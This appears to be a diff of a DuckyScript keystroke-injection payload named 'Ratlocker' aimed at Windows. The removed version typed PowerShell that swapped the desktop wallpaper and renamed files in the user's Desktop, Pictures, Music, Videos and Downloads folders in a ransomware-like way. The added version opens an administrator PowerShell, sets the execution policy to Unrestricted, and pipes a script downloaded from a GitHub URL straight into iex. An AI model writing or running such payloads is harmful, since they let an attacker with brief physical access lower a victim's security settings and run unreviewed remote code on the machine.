@@ -1,64 +1,22 @@
 REM Title:          Ratlocker
-REM Author:	    Ratcode404(.github.io) (special thanks to them)
+REM Author:	        WalkTheEarth(.github.io)
 REM Target:         Windows
-REM Description:    Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backuped on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.
+REM Description:    Based off RatCode's ratlocker. 
 
-REM Base delay after initiation and ps1 startup
+REM Download script and run it
 DELAY 250
 GUI d
-GUI r
+GUI x
 DELAY 100
-STRING powershell.exe
-ENTER
+STRING a
 DELAY 250
-
-REM Backup Wallpaper
-STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $HOME\AppData\Local\Temp\YourOldWallpaper.png
-DELAY 250
-
-REM download new wallpaper
-STRING Invoke-WebRequest https://raw.githubusercontent.com/WalkTheEarth/ratlocker/main/RatLocker.png -OutFile $HOME\AppData\Local\Temp\RatLocker.png
-REM Set new wallpaper
-STRING $MyWallpaper="$HOME\AppData\Local\Temp\RatLocker.png"
+LEFTARROW
+DELAY 100
 ENTER
-STRING $code = @'
-ENTER
-STRING using System.Runtime.InteropServices;
-ENTER
-STRING namespace Win32{
-ENTER
-STRING      public class Wallpaper{
-ENTER
-STRING         [DllImport("user32.dll", CharSet=CharSet.Auto)]
-ENTER
-STRING          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
-ENTER
-STRING          public static void SetWallpaper(string thePath){
-ENTER
-STRING            SystemParametersInfo(20,0,thePath,3);
-ENTER
-STRING          }
-ENTER
-STRING     }
-ENTER
-STRING  } 
-ENTER
-STRING '@
-ENTER
-STRING add-type $code 
-ENTER
-STRING [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+DELAY 400
+STRING Set-ExecutionPolicy Unrestricted
 ENTER
 DELAY 500
-
-REM Add ratl0ck3r extension
-STRING dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
-ENTER
-STRING dir $HOME\Pictures\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
-ENTER
-STRING dir $HOME\Music\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
-ENTER
-STRING dir $HOME\Videos\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
-ENTER
-STRING dir $HOME\Downloads\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
-ENTER
+STRING irm https://raw.githubusercontent.com/WalkTheEarth/ratlocker/refs/heads/main/Script.ps1 | iex
+DELAY 1000
+GUI d
